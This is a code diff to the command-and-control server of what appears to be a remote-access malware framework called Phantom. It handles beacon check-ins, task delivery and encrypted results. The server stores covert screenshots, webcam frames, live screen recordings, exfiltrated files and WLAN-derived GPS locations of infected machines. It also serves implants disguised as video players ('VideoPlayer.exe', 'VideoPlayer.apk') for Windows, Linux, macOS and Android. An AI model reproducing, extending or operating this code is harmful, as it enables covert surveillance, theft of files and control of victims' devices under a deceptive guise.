+        returned. A lost HTTP response therefore lost work permanently. A
+        short lease prevents duplicate delivery during normal polling while
+        allowing redelivery after an outage.
+        """
+        now = datetime.now()
+        now_text = now.isoformat(timespec="seconds")
+        tasks_to_send: list[dict[str, Any]] = []
+        # Drain a deferred write HERE too: a check-in is the one event that is
+        # guaranteed to keep happening while a beacon is alive, so it bounds
+        # the debounce window instead of leaving `_state_dirty` set until the
+        # process is finally killed.
+        if self._state_dirty:
+            self._persist_state(force=True)
+        with self.lock:
+            retained: list[dict[str, Any]] = []
+            for task in self.tasks.get(beacon_id, []):
+                leased_at = task.get("_leased_at")
+                if leased_at:
+                    try:
+                        lease_age = (now - datetime.fromisoformat(leased_at)).total_seconds()
+                    except (TypeError, ValueError):
+                        lease_age = TASK_LEASE_SECONDS
+                    if lease_age < TASK_LEASE_SECONDS:
+                        retained.append(task)
+                        continue
+                task["_leased_at"] = now_text
+                task["_sent_at"] = now_text   # UI: pending -> sent
+                retained.append(task)
+                tasks_to_send.append({
+                    key: value for key, value in task.items()
+                    if key != "_leased_at"
+                })
+            self.tasks[beacon_id] = retained
+        return tasks_to_send
+
+    def release_lease(self, beacon_id: str, task_ids: list[str]) -> int:
+        """Hand leased tasks back so the next check-in delivers them again.
+
+        Used when the response could not be sealed: without it the batch is
+        invisible to the beacon for ``TASK_LEASE_SECONDS`` while the server
+        has already reported it as delivered.
+        """
+        wanted = {str(t or "") for t in (task_ids or []) if t}
+        if not wanted:
+            return 0
+        released = 0
+        with self.lock:
+            for task in self.tasks.get(beacon_id, []):
+                if str(task.get("task_id", "")) in wanted:
+                    task.pop("_leased_at", None)
+                    task.pop("_sent_at", None)
+                    released += 1
+        return released
+
+    def _ack_task_locked(self, beacon_id: str, task_id: str) -> None:
+        """Remove one acknowledged task; caller must hold ``self.lock``."""
+        self.tasks[beacon_id] = [
+            task for task in self.tasks.get(beacon_id, [])
+            if task.get("task_id") != task_id
+        ]
 
     def add_result(self, beacon_id: str, task_id: str, output: str) -> None:
+        # How many oldest results this call drops; reported AFTER the lock
+        # is released (see the tail of this method).
+        pruned = 0
         with self.lock:
-            self.results.setdefault(beacon_id, []).append({
+            # A retry after a lost 200 response must be idempotent.
+            existing = self.results.setdefault(beacon_id, [])
+            if any(result.get("task_id") == task_id for result in existing):
+                self._ack_task_locked(beacon_id, task_id)
+                return
+            # remember the COMMAND the operator queued so results can be
+            # displayed with their originating command (the pending task is
+            # about to be acked/removed, so the command must travel WITH the
+            # result record)
+            task_cmd = ""
+            for t in self.tasks.get(beacon_id, []):
+                if t.get("task_id") == task_id:
+                    task_cmd = t.get("command", "")
+                    break
+            existing.append({
                 "task_id": task_id,
+                "command": task_cmd,
                 "output": output,
                 "time": datetime.now().isoformat(timespec="seconds"),
             })
+            if len(existing) > MAX_RESULTS_PER_BEACON:
+                pruned = len(existing) - MAX_RESULTS_PER_BEACON
+                del existing[:-MAX_RESULTS_PER_BEACON]
+            self._ack_task_locked(beacon_id, task_id)
+            # the result AND the settled task: this is the operator's
+            # evidence, the one thing a restart must never cost them.
+            self._persist_state()
+            # Binary artifacts (screenshot / camera / exfil) land as real
+            # files in data/screenshots/ + data/downloads/ so the operator
+            # gets a usable file instead of a wall of base64 — and the
+            # stored result text becomes a friendly one-liner pointing at
+            # the artifact (both the CLI and Electron render it).
+            artifact_note = ""
+            if output.startswith("SCREENSHOT_B64:"):
+                p = self._save_binary_artifact(beacon_id, "screenshots", "bmp",
+                                               output[len("SCREENSHOT_B64:"):])
+                artifact_note = f"[Screenshot captured — saved to {p}]" if p \
+                                else "[Screenshot decode failed]"
+            elif output.startswith("REMOTE_FRAME_B64:"):
+                # Remote-session module: a live GUI frame (JPEG/PNG). Land in
+                # data/remote/ so the operator can watch the stream.
+                p = self._save_binary_artifact(beacon_id, "remote", "",
+                                               output[len("REMOTE_FRAME_B64:"):])
+                artifact_note = f"[Remote frame captured — saved to {p}]" if p \
+                                else "[Remote frame decode failed]"
+            elif output.startswith("CAM_FRAME:"):
+                raw = output[len("CAM_FRAME:"):]
+                device, _, b64 = raw.partition("|")
+                if b64.startswith("MEDIA_B64:"):
+                    b64 = b64[len("MEDIA_B64:"):]
+                forced = f"camera_{device or 'cam'}.bmp"
+                p = self._save_binary_artifact(beacon_id, "screenshots", "bmp",
+                                               b64.strip(), forced_name=forced)
+                artifact_note = f"[Camera frame captured ({device or 'cam'}) — saved to {p}]" if p \
+                                else "[Camera decode failed]"
+            elif output.startswith("MEDIA_B64:"):
+                p = self._save_binary_artifact(beacon_id, "downloads", "bin",
+                                               output[len("MEDIA_B64:"):])
+                artifact_note = f"[Media artifact saved to {p}]" if p \
+                                else "[Media decode failed]"
+            elif output.startswith("SCREENREC_B64:"):
+                # passive screen recording (PHREC container of JPEG frames)
+                p = self._save_recording_frames(
+                    beacon_id, output[len("SCREENREC_B64:"):])
+                artifact_note = f"[Screen recording saved — {p}]" if p \
+                                else "[Screen recording decode failed]"
+            elif output.startswith("SCREEN_LIVE_SEG:"):
+                # progressive live segment: appended to the live buffer as it
+                # arrives so the UI can watch the screen WHILE recording.
+                n = self._append_live_segment(
+                    beacon_id, output[len("SCREEN_LIVE_SEG:"):])
+                artifact_note = (f"[Live stream segment {n} — recording in "
+                                 "progress]" if n else
+                                 "[Live segment decode failed]")
+            elif output.startswith("SCREEN_DUMP:"):
+                p = self._save_binary_artifact(
+                    beacon_id, "recordings", "mp4",
+                    output[len("SCREEN_DUMP:"):],
+                    forced_name=f"screenrec_{datetime.now().strftime('%H%M%S')}.mp4")
+                artifact_note = f"[Screen recording dump — saved to {p}]" if p \
+                                else "[Screen dump decode failed]"
+            elif output.startswith("FILE_B64:"):
+                # beacon sends "FILE_B64:<b64>" — derive the name from the
+                # task the operator queued (download <path>).
+                b64_data = output[len("FILE_B64:"):].strip()
+                forced = ""
+                if task_cmd.lower().startswith("download "):
+                    forced = os.path.basename(task_cmd.split(None, 1)[1])
+                p = self._save_binary_artifact(beacon_id, "downloads", "",
+                                               b64_data, forced_name=forced)
+                artifact_note = f"[File downloaded — saved to {p}]" if p \
+                                else "[File decode failed]"
+            elif output.startswith("WLAN_GEOLOCATE:"):
+                # resolve real GPS coordinates C2-side (Apple WLOC, free)
+                try:
+                    import json as _json
+                    from phantom.utils.c2_helpers import _apple_geolocate, _format_wlan_table
+                    aps = _json.loads(output[len("WLAN_GEOLOCATE:"):])
+                    artifact_note = _format_wlan_table(aps) + (_apple_geolocate(aps) or "")
+                except Exception as exc:
+                    artifact_note = f"WLAN geolocate parse failed: {exc}"
+            if artifact_note:
+                existing[-1]["output"] = artifact_note
+            # Exit acknowledgment: the beacon is shutting down — mark it
+            # offline in place (history preserved) so `beacons` does not
+            # show a stale "active" entry that will never check in again.
+            if output.startswith("\x01\x02EX"):
+                info = self.beacons.get(beacon_id)
+                if info is not None:
+                    info["status"] = "exited"
+                    info["exited_at"] = datetime.now().isoformat(timespec="seconds")
+                from phantom.utils.audit_log import audit_log
+                audit_log.append("beacon_exited", beacon_id=beacon_id)
+
+        # Pruning used to be SILENT: `del existing[:-MAX_RESULTS_PER_BEACON]`
+        # dropped the OLDEST results with no trace, so on a long engagement
+        # the operator's first proof-of-access could vanish and nothing said
+        # so. Announce it on the audit chain (chain of custody) AND on the
+        # campaign timeline the UI renders. Emitted outside the lock: the
+        # hash-chained append does an fsync, which must not block the
+        # listener while it holds the state lock.
+        if pruned:
+            logger.warning(
+                f"Pruned {pruned} oldest result(s) for beacon {beacon_id} "
+                f"(cap {MAX_RESULTS_PER_BEACON})")
+            try:
+                from phantom.utils.audit_log import audit_log
+                audit_log.append("results_pruned", beacon_id=beacon_id,
+                                 pruned=pruned, kept=MAX_RESULTS_PER_BEACON)
+            except Exception:
+                pass
+            try:
+                from phantom.api.server import _push_timeline
+                _push_timeline(
+                    "c2", "results_pruned",
+                    f"{pruned} oldest result(s) pruned for beacon "
+                    f"{beacon_id[:16]} (cap {MAX_RESULTS_PER_BEACON})")
+            except Exception:
+                pass
+
+    @staticmethod
+    def _sniff_ext(raw: bytes) -> str:
+        """Best-effort real format from magic bytes. The beacon's camera path
+        is cross-platform: Windows sends BMP, Linux/Android send JPEG. Saving
+        a JPEG with a .bmp name makes Electron serve it as image/bmp and the
+        frame never renders — sniff the actual format instead."""
+        if raw[:3] == b"\xff\xd8\xff":
+            return ".jpg"
+        if raw[:8] == b"\x89PNG\r\n\x1a\n":
+            return ".png"
+        if raw[:2] == b"BM":
+            return ".bmp"
+        if raw[:4] == b"GIF8":
+            return ".gif"
+        if raw[4:8] in (b"ftyp", b"moov") or raw[:3] == b"\x00\x00\x00":
+            return ".mp4"
+        return ""
+
+    def _save_binary_artifact(self, beacon_id: str, subdir: str, ext: str,
+                              b64_data: str, forced_name: str = "") -> str:
+        """Decode a base64 artifact and write it under data/<subdir>/.
+        Returns the written path (or "" on failure): the result record gets
+        a friendly one-liner pointing at the file. A bad payload must never
+        break result handling."""
+        try:
+            import base64
+            from phantom.utils.paths import data_dir
+            raw = base64.b64decode(b64_data, validate=False)
+            if not raw:
+                return
+            d = os.path.join(data_dir(), subdir)
+            os.makedirs(d, exist_ok=True)
+            # P1-11: enforce the per-directory quota BEFORE writing — a
+            # runaway stream must not fill the operator's disk silently
+            from phantom.core.artifact_policy import over_quota
+            if over_quota(d, subdir):
+                logger.warning("artifact refused (quota): %s (%d bytes from "
+                               "beacon %s)", subdir, len(raw), beacon_id)
+                return ""
+            ts = datetime.now().strftime("%Y%m%d_%H%M%S")
+            safe_beacon = "".join(c for c in beacon_id if c.isalnum())[:16] or "beacon"
+            real_ext = self._sniff_ext(raw) or ("" if not ext else f".{ext}")
+            if forced_name:
+                base = os.path.splitext(os.path.basename(forced_name))[0] or "file"
+                safe_name = base.replace("\\", "_") + real_ext
+            else:
+                safe_name = f"{safe_beacon}_{ts}{real_ext or '.bin'}"
+            path = os.path.join(d, safe_name)
+            with open(path, "wb") as fh:
+                fh.write(raw)
+            # Ownership index: the per-beacon remote viewer filters on this,
+            # NOT on the (collidable, truncated) filename prefix.
+            from phantom.core.artifact_ownership import record_owner
+            record_owner(subdir, safe_name, beacon_id)
+            from phantom.utils.audit_log import audit_log
+            audit_log.append("artifact_saved", beacon_id=beacon_id,
+                             path=path, size=len(raw))
+            logger.info("artifact saved: %s (%d bytes)", path, len(raw))
+            return path
+        except Exception as exc:
+            logger.warning("artifact save failed: %s", exc)
+            return ""
+
+    # ── Screen recording helpers ────────────────────────────────────────────
+
+    @staticmethod
+    def _recordings_root() -> str:
+        from phantom.utils.paths import data_dir
+        return os.path.join(data_dir(), "recordings")
+
+    def _save_recording_frames(self, beacon_id: str, b64_data: str) -> str:
+        """Decode a passive PHREC recording ("PHREC" + u32 count + per frame
+        u32 ts_ms + u32 len + JPEG). Frames are written flat as
+        <beacon>_<ts>_frame_NNN.jpg under data/recordings/ so they are
+        viewable even without ffmpeg; if ffmpeg exists the frames are ALSO
+        muxed into <beacon>_<ts>.mp4. Returns a human path, or ""."""
+        import base64 as _b64
+        import shutil as _sh
+        try:
+            raw = _b64.b64decode(b64_data, validate=False)
+        except Exception:
+            return ""
+        if raw[:5] != b"PHREC" or len(raw) < 9:
+            return ""
+        try:
+            count = int.from_bytes(raw[5:9], "little")
+        except Exception:
+            return ""
+        if count <= 0 or count > 6000:
+            return ""
+        root = self._recordings_root()
+        safe = "".join(c for c in beacon_id if c.isalnum())[:16] or "beacon"
+        ts = datetime.now().strftime("%Y%m%d_%H%M%S")
+        try:
+            os.makedirs(root, exist_ok=True)
+        except OSError:
+            return ""
+        off = 9
+        written = 0
+        jpgs: list[str] = []
+        for i in range(count):
+            if off + 8 > len(raw):
+                break
+            jlen = int.from_bytes(raw[off + 4:off + 8], "little")
+            off += 8
+            if jlen <= 0 or off + jlen > len(raw):
+                break
+            jpg = raw[off:off + jlen]
+            off += jlen
+            if jpg[:3] != b"\xff\xd8\xff":
+                continue
+            name = f"{safe}_{ts}_frame_{i:04d}.jpg"
+            try:
+                with open(os.path.join(root, name), "wb") as fh:
+                    fh.write(jpg)
+                jpgs.append(name)
+                written += 1
+            except OSError:
+                break
+        if written == 0:
+            return ""
+        # best-effort mux into an actual .mp4 for the video player
+        mp4 = os.path.join(root, f"{safe}_{ts}.mp4")
+        ffmpeg = _sh.which("ffmpeg") or _sh.which("ffmpeg.exe")
+        if ffmpeg:
+            try:
+                import subprocess as _sp
+                pattern = os.path.join(root, f"{safe}_{ts}_frame_%04d.jpg")
+                _sp.run([ffmpeg, "-y", "-framerate", "2", "-i", pattern,
+                         "-c:v", "libx264", "-pix_fmt", "yuv420p", "-an",
+                         mp4], capture_output=True, timeout=60)
+            except Exception:
+                pass
+        if os.path.exists(mp4):
+            return mp4
+        return f"{written} frames ({safe}_{ts})"
+
+    def _append_live_segment(self, beacon_id: str, b64_data: str) -> int:
+        """Append one progressive live segment to the beacon's live buffer
+        (and a copy on disk under data/recordings/live/). Returns the segment
+        index, or 0 on failure."""
+        import base64 as _b64
+        try:
+            raw = _b64.b64decode(b64_data, validate=False)
+        except Exception:
+            return 0
+        if not raw:
+            return 0
+        with self.lock:
+            buf = self.live_segments.setdefault(beacon_id, [])
+            n = len(buf) + 1
+            buf.append({"seq": n, "size": len(raw),
+                        "time": datetime.now().isoformat(timespec="seconds")})
+            if len(buf) > 500:
+                del buf[:-500]
+        # persist a copy (best-effort) for later concat/playback
+        try:
+            root = os.path.join(self._recordings_root(), "live")
+            os.makedirs(root, exist_ok=True)
+            safe = "".join(c for c in beacon_id if c.isalnum())[:16] or "beacon"
+            with open(os.path.join(root, f"{safe}_seg_{n:04d}.bin"), "wb") as fh:
+                fh.write(raw)
+        except OSError:
+            pass
+        self._concat_live_mp4(beacon_id)
+        return n
+
+    def _concat_live_mp4(self, beacon_id: str) -> str:
+        """Best-effort: mux buffered live segments into a single playable
+        .mp4 (data/recordings/live/<beacon>_live.mp4) with ffmpeg whenever a
+        new segment arrives, so the UI can play the growing recording."""
+        import shutil as _sh
+        ffmpeg = _sh.which("ffmpeg") or _sh.which("ffmpeg.exe")
+        if not ffmpeg:
+            return ""
+        root = os.path.join(self._recordings_root(), "live")
+        safe = "".join(c for c in beacon_id if c.isalnum())[:16] or "beacon"
+        segs = sorted(f for f in os.listdir(root)
+                      if f.startswith(f"{safe}_seg_") and f.endswith(".bin"))
+        if len(segs) < 2:
+            return ""
+        try:
+            import subprocess as _sp
+            lst = os.path.join(root, f"{safe}_list.txt")
+            with open(lst, "w", encoding="utf-8") as fh:
+                for s in segs:
+                    fh.write(f"file '{os.path.join(root, s)}'\n")
+            out = os.path.join(root, f"{safe}_live.mp4")
+            _sp.run([ffmpeg, "-y", "-f", "concat", "-safe", "0",
+                     "-i", lst, "-c", "copy", out],
+                    capture_output=True, timeout=60)
+            return out if os.path.exists(out) else ""
+        except Exception:
+            return ""
+
+    def get_live_segments(self, beacon_id: str) -> list[dict[str, Any]]:
+        with self.lock:
+            return list(self.live_segments.get(beacon_id, []))
 
     def get_beacons(self) -> dict[str, dict[str, Any]]:
         with self.lock:
@@ -94,7 +1269,21 @@ class C2State:
 
 c2_state = C2State()
 PAYLOAD_AUTH_TOKEN = get_payload_token()
-API_TOKEN = os.getenv("PHANTOM_API_TOKEN", "").strip()
+
+
+def _current_api_token() -> str:
+    """Read the operator API token at CALL time, not at import time.
+
+    The token is rotatable at runtime (``regenerate_api_token``). A value
+    captured once at import keeps accepting the OLD secret until the
+    process restarts — a revocation that does not actually revoke, and a
+    divergence from ``phantom.api.server`` which already reads it live.
+    Reading it here makes rotation take effect in-process.
+    """
+    try:
+        return get_api_token()
+    except Exception:
+        return ""
 
 
 # ── Auth Middleware ─────────────────────────────────────────────────────────
@@ -104,19 +1293,131 @@ async def api_auth_middleware(request: web.Request, handler):
     """Protect REST API control endpoints with PHANTOM_API_TOKEN.
     If PHANTOM_API_TOKEN is empty (unset), auth is disabled for backward compat."""
     protected = ("/api/v1/beacons", "/api/v1/queue", "/api/v1/results")
-    if request.path in protected and API_TOKEN:
+    expected = _current_api_token()
+    if request.path in protected and expected:
         token = request.headers.get("X-Api-Token", "")
-        if token != API_TOKEN:
+        # timing-safe: plain == leaks match-length byte-by-byte
+        if not hmac.compare_digest(token.encode(), expected.encode()):
             logger.warning(f"Unauthorized API access to {request.path} from {request.remote}")
             return web.Response(status=403, text="Forbidden")
     return await handler(request)
 
 
+# P0-10: the route x principal x method authorization matrix, EXPLICIT.
+# Every DECLARED path lists which principals may call it and with which
+# methods. `auth_matrix_middleware` is the enforcement point for these paths:
+# a method not declared for the path, or the wrong identity namespace, is
+# refused 403 BEFORE the handler — so a new method or a slash variant cannot
+# silently slip past. Paths OUTSIDE the matrix (the malleable catch-all, the
+# payload/stager downloads) are deliberately not governed here: they
+# authenticate inside their own handlers.
+#   beacon   = per-beacon HMAC identity (verified inside the handler)
+#   operator = PHANTOM_API_TOKEN bearer (REST control endpoints)
+#   any      = no auth required (health/malleable catch-all funnel)
+AUTH_MATRIX: dict[str, dict[str, tuple]] = {
+    "operator": {"/api/v1/beacons": ("GET",),
+                 "/api/v1/queue": ("POST",),
+                 "/api/v1/results": ("GET",)},
+    "any": {"/api/v1/ping": ("GET", "POST"),
+            "/": ("GET",)},
+    "beacon": {"/api/v1/result": ("POST",)},
+}
+
+
+def matrix_allows(path: str, method: str, principal: str) -> bool:
+    """True when (path, method) is explicitly granted to `principal` or to
+    principal 'any'."""
+    for principal_name in (principal, "any"):
+        table = AUTH_MATRIX.get(principal_name, {})
+        if method in table.get(path, ()):
+            return True
+    return False
+
+
+# Paths the matrix governs, split by the identity namespace they belong to.
+_OPERATOR_PATHS = frozenset(AUTH_MATRIX.get("operator", {}))
+_BEACON_PATHS = frozenset(AUTH_MATRIX.get("beacon", {}))
+_MATRIX_PATHS = frozenset(
+    path for table in AUTH_MATRIX.values() for path in table)
+
+
+def _normalize_path(path: str) -> str:
+    """Matrix keys are slash-less; a trailing-slash variant must not bypass."""
+    return path.rstrip("/") or "/"
+
+
+@web.middleware
+async def auth_matrix_middleware(request: web.Request, handler):
+    """Enforce the matrix on the paths it DECLARES (deny-by-default there).
+
+    For a declared path: the method must be listed by some principal, and a
+    beacon identity (X-Beacon-Id) must never drive an operator control
+    endpoint (nor an operator call a beacon-only endpoint). Paths outside the
+    matrix pass through to their own handler-level authentication.
+    """
+    path = _normalize_path(request.path)
+    if path not in _MATRIX_PATHS:
+        return await handler(request)
+    method = request.method.upper()
+    declared = any(method in AUTH_MATRIX.get(pr, {}).get(path, ())
+                   for pr in AUTH_MATRIX)
+    is_beacon = bool(request.headers.get("X-Beacon-Id"))
+    wrong_namespace = ((path in _OPERATOR_PATHS and is_beacon)
+                       or (path in _BEACON_PATHS and not is_beacon))
+    if not declared or wrong_namespace:
+        logger.warning("auth matrix denied %s %s from %s",
+                       method, path, request.remote)
+        return web.Response(status=403, text="Forbidden")
+    return await handler(request)
+
+
+@web.middleware
+async def mtls_auth_middleware(request: web.Request, handler):
+    """Enforce client certificate on operator API routes.
+
+    Beacon routes (/api/v1/ping, /api/v1/result and the malleable catch-all)
+    authenticate with the per-beacon HMAC-SHA256 scheme (timestamp + counter
+    + nonce, anti-replay) enforced inside their handlers — a strong
+    cryptographic identity that does not depend on a machine-installed
+    client certificate. Requiring mTLS there too would make check-in
+    impossible for beacons whose private key cannot be bound at handshake
+    time (schannel key isolation) without adding real security, since the
+    HMAC already covers method, path, body and freshness.
+
+    Operator API routes (beacons list, task queue, results) keep the
+    client-certificate requirement in addition to the API token.
+    """
+    if not use_mtls():
+        return await handler(request)
+    # Operator-facing routes that require a valid client certificate.
+    protected_prefixes = ("/api/v1/beacons", "/api/v1/queue", "/api/v1/results")
+    if not any(request.path.startswith(p) for p in protected_prefixes):
+        return await handler(request)
+    try:
+        transport = request.transport
+        if transport is None:
+            return await handler(request)
+        ssl_obj = transport.get_extra_info("ssl_object")
+        if ssl_obj is None:
+            # Non-TLS transport — let the handler decide
+            return await handler(request)
+        peer_cert = ssl_obj.getpeercert(binary_form=True)
+        if peer_cert is None:
+            logger.warning(f"mTLS client certificate missing from {request.remote}")
+            return web.Response(status=401, text="mTLS client certificate required")
+    except Exception as exc:
+        logger.warning(f"mTLS verification error: {exc}")
+        return web.Response(status=401, text="TLS verification failed")
+    return await handler(request)
+
+
 # ── aiohttp Handlers ───────────────────────────────────────────────────────
 
-async def handle_checkin(request: web.Request) -> web.Response:
+async def handle_checkin(request: web.Request, pre_body: Optional[str] = None) -> web.Response:
     """GET/POST /api/v1/ping — Beacon checks in and requests pending tasks.
-       If POST, body contains encrypted telemetry JSON."""
+       If POST, body contains encrypted telemetry JSON.
+       pre_body: body already read by a caller (malleable catch-all) — aiohttp
+       consumes the payload once, so re-reading after the catch-all yields ""."""
     try:
         beacon_id = request.headers.get("X-Beacon-Id")
         if not beacon_id:
@@ -126,41 +1427,89 @@ async def handle_checkin(request: web.Request) -> web.Response:
         info = {"ip": request.remote, "last_seen": datetime.now().isoformat(timespec="seconds")}
 
         # Parse body BEFORE registering beacon, so we have OS info for correct auto-persist
-        if request.method == "POST" and request.can_read_body:
+        encrypted_body = ""
+        if pre_body is not None:
+            encrypted_body = pre_body
+        elif request.method == "POST" and request.can_read_body:
             encrypted_body = await request.text()
-            if encrypted_body:
-                decrypted_body = decrypt_data(encrypted_body)
-                if decrypted_body:
-                    try:
-                        data = json.loads(decrypted_body)
-                        sysinfo = data.get("sysinfo", "")
-                        netinfo = data.get("netinfo", "")
-                        
-                        # Basic parsing of sysinfo lines
-                        for line in sysinfo.split("\n"):
-                            if line.startswith("OS: "): info["os"] = line[4:].strip()
-                            if line.startswith("User: "): info["user"] = line[6:].strip()
-                            if line.startswith("Arch: "): info["arch"] = line[6:].strip()
-                            if line.startswith("Host: "): info["hostname"] = line[6:].strip()
-                        
-                        # Basic parsing of netinfo for local IPs
-                        ips = []
-                        for line in netinfo.split("\n"):
-                            if "IP: " in line:
-                                ips.append(line.split("IP: ")[1].split(" ")[0])
-                            elif "IP (v4): " in line:
-                                ips.append(line.split("IP (v4): ")[1].strip())
-                        if ips:
-                            info["local_ips"] = ", ".join(ips)
-                    except Exception as e:
-                        logger.error(f"Failed to parse telemetry: {e}")
+        if not c2_state.authenticate_beacon(request, encrypted_body):
+            logger.warning(f"Unauthenticated check-in rejected for {beacon_id}")
+            try:
+                from phantom.utils.audit_log import audit_log
+                audit_log.append("auth_rejected", beacon_id=beacon_id,
+                                 ip=request.remote)
+            except Exception:
+                pass
+            return web.Response(status=401, text="Unauthorized")
+
+        if encrypted_body:
+            # PER-BEACON envelope key: derived from THIS identity's HMAC
+            # secret (falling back to the deployment key for beacons built
+            # before per-beacon derivation).
+            decrypted_body = decrypt_for_beacon(encrypted_body, beacon_id)
+            if decrypted_body:
+                try:
+                    data = json.loads(decrypted_body)
+                    sysinfo = data.get("sysinfo", "")
+                    netinfo = data.get("netinfo", "")
+
+                    # Basic parsing of sysinfo lines
+                    for line in sysinfo.split("\n"):
+                        if line.startswith("OS: "): info["os"] = line[4:].strip()
+                        if line.startswith("User: "): info["user"] = line[6:].strip()
+                        if line.startswith("Arch: "): info["arch"] = line[6:].strip()
+                        if line.startswith("Host: "): info["hostname"] = line[6:].strip()
+
+                    # Basic parsing of netinfo for local IPs
+                    ips = []
+                    for line in netinfo.split("\n"):
+                        if "IP: " in line:
+                            ips.append(line.split("IP: ")[1].split(" ")[0])
+                        elif "IP (v4): " in line:
+                            ips.append(line.split("IP (v4): ")[1].strip())
+                    if ips:
+                        info["local_ips"] = ", ".join(ips)
+                except Exception as e:
+                    logger.error(f"Failed to parse telemetry: {e}")
 
         # Single update_beacon call after all info is gathered
         c2_state.update_beacon(beacon_id, info)
 
         pending = c2_state.get_pending_tasks(beacon_id)
+        # Delivery visibility: a task that is leased but never executed is
+        # invisible from the operator side (it just stays "sent"). One line
+        # per delivered batch names the tasks the beacon actually received.
+        if pending:
+            logger.info(
+                "check-in %s: delivering %d task(s): %s",
+                beacon_id, len(pending),
+                ", ".join(str(t.get("command", "?"))[:60] for t in pending))
         response_data = json.dumps({"tasks": pending})
-        encrypted_response = encrypt_data(response_data)
+        # Seal with the key THIS beacon derives, or the tasks never open.
+        encrypted_response = encrypt_for_beacon(response_data, beacon_id)
+        if pending:
+            logger.info("check-in %s: sealed response %d bytes for %d task(s)",
+                        beacon_id, len(encrypted_response), len(pending))
+        if not encrypted_response:
+            # 200 with an EMPTY body is not "no work": the beacon cannot tell
+            # it from a valid answer, the tasks stay leased for 60s, and the
+            # log line above has already claimed "delivering N task(s)". Fail
+            # loudly and hand the lease back so the next check-in retries.
+            released = c2_state.release_lease(
+                beacon_id, [t.get("task_id", "") for t in pending])
+            logger.error("check-in %s: response encryption FAILED "
+                         "(no envelope key for this identity); %d task(s) "
+                         "released, answering 500 so the beacon retries",
+                         beacon_id, released)
+            return web.Response(status=500, text="seal failed")
+        if os.environ.get("PHANTOM_DEBUG_SEALED"):
+            try:
+                dbg = os.path.join(os.environ.get("TEMP", "."), "opencode",
+                                   "sealed_actual.txt")
+                with open(dbg, "w", encoding="ascii") as handle:
+                    handle.write(encrypted_response)
+            except OSError:
+                pass
 
         return web.Response(text=encrypted_response, content_type="text/plain")
     except Exception as e:
@@ -168,15 +1517,19 @@ async def handle_checkin(request: web.Request) -> web.Response:
         return web.Response(status=500)
 
 
-async def handle_result(request: web.Request) -> web.Response:
-    """POST /api/v1/result — Beacon sends encrypted command output."""
+async def handle_result(request: web.Request, pre_body: Optional[str] = None) -> web.Response:
+    """POST /api/v1/result — Beacon sends encrypted command output.
+       pre_body: body already read by the malleable catch-all caller."""
     try:
         beacon_id = request.headers.get("X-Beacon-Id")
         if not beacon_id:
             return web.Response(status=400)
 
-        encrypted_body = await request.text()
-        decrypted_body = decrypt_data(encrypted_body)
+        encrypted_body = pre_body if pre_body is not None else await request.text()
+        if not c2_state.authenticate_beacon(request, encrypted_body):
+            logger.warning(f"Unauthenticated result rejected for {beacon_id}")
+            return web.Response(status=401, text="Unauthorized")
+        decrypted_body = decrypt_for_beacon(encrypted_body, beacon_id)
 
         if not decrypted_body:
             logger.warning(f"Result decryption failed from beacon {beacon_id}")
@@ -188,10 +1541,20 @@ async def handle_result(request: web.Request) -> web.Response:
             logger.error(f"Failed to parse result JSON from {beacon_id}. Body: {decrypted_body[:100]}... Error: {e}")
             return web.Response(status=400)
             
-        task_id = data.get("task_id", "unknown")
-        output = data.get("output", "")
+        if beacon_id not in c2_state.get_beacons():
+            logger.warning(f"Result from unregistered beacon {beacon_id}")
+            return web.Response(status=404, text="Unknown beacon")
 
-        c2_state.add_result(beacon_id, task_id, output)
+        task_id = data.get("task_id", "")
+        output = data.get("output", "")
+        if not isinstance(task_id, str) or not task_id or len(task_id) > 256:
+            return web.Response(status=400, text="Invalid task_id")
+        if not isinstance(output, str):
+            return web.Response(status=400, text="Invalid output")
+        if len(output.encode("utf-8", errors="replace")) > MAX_RESULT_OUTPUT_BYTES:
+            return web.Response(status=413, text="Result too large")
+
+        _record_task_result_with_audit(beacon_id, task_id, output)
 
         return web.Response(text="OK")
     except Exception as e:
@@ -199,71 +1562,335 @@ async def handle_result(request: web.Request) -> web.Response:
         return web.Response(status=500)
 
 
+def _record_task_result_with_audit(beacon_id: str, task_id: str,
+                                   output: str) -> None:
+    """Store a beacon result and write its audit entry.
+
+    The two are not equally important: the RESULT must land so the operator
+    sees it, and the AUDIT entry must never silently vanish — that is the whole
+    point of a chain of custody. A failed append is counted in `quiet` and
+    logged; the beacon still gets its OK, because retrying a result we already
+    hold would duplicate work, but the operator can now see that this run ran
+    with a degraded audit log.
+    """
+    c2_state.add_result(beacon_id, task_id, output)
+    try:
+        from phantom.utils.audit_log import audit_log
+        audit_log.append("task_result", beacon_id=beacon_id, task_id=task_id,
+                         output_len=len(output))
+    except Exception as exc:
+        from phantom.utils import quiet
+        quiet.swallow("c2_server.task_result.audit_append", exc)
+        logger.warning(f"Audit append failed for task {task_id}: {exc}")
+
+
+# Filename a browser saves the artifact under. Without a
+# Content-Disposition header the browser names the file after the LAST URL
+# SEGMENT — `payload_android`, no extension — and a file with no extension
+# cannot be run on Windows nor installed on Android. The extension must
+# match the real format: PE -> .exe, APK -> .apk, ELF -> none (chmod+run).
+_PAYLOAD_DOWNLOADS = {
+    "/api/v1/payload": "VideoPlayer.exe",
+    "/api/v1/payload_pic": "beacon.bin",
+    "/api/v1/payload_linux": "video-player-linux",
+    "/api/v1/payload_linux_x86": "video-player-linux-x86",
+    "/api/v1/payload_macos": "video-player-macos",
+    "/api/v1/payload_android": "VideoPlayer.apk",
+    "/api/v1/remote_payload_windows": "remote.exe",
+    "/api/v1/remote_payload_windows_mem": "remote-mem.bin",
+    "/api/v1/remote_payload_linux": "remote-linux",
+    "/api/v1/remote_payload_macos": "remote-macos",
+    "/api/v1/remote_payload_android": "remote.apk",
+}
+
+
+def payload_download_name(path: str) -> str:
+    """Runnable filename for a payload route (used in Content-Disposition)."""
+    return _PAYLOAD_DOWNLOADS.get(path, "payload.bin")
+
+
+def _payload_token_ok(request: web.Request) -> bool:
+    """May this caller fetch a payload?
+
+    Two credentials are accepted. The deployment-wide PHANTOM_PAYLOAD_TOKEN
+    stays valid for beacons built before per-beacon tokens and for the
+    operator's own curl one-liners. A PER-BEACON token is derived from the
+    identity carried in X-Beacon-Id — which the beacon already sends on every
+    payload-fetch route — so a captured enrolled binary authorises only its
+    own download. Fresh builds carry no deployment token at all.
+    """
+    token = (request.headers.get("X-Auth-Token")
+             or request.query.get("auth") or "")
+    if not token:
+        return False
+    if hmac.compare_digest(token.encode(), get_payload_token().encode()):
+        return True
+    beacon_id = request.headers.get("X-Beacon-Id", "")
+    if not beacon_id:
+        return False
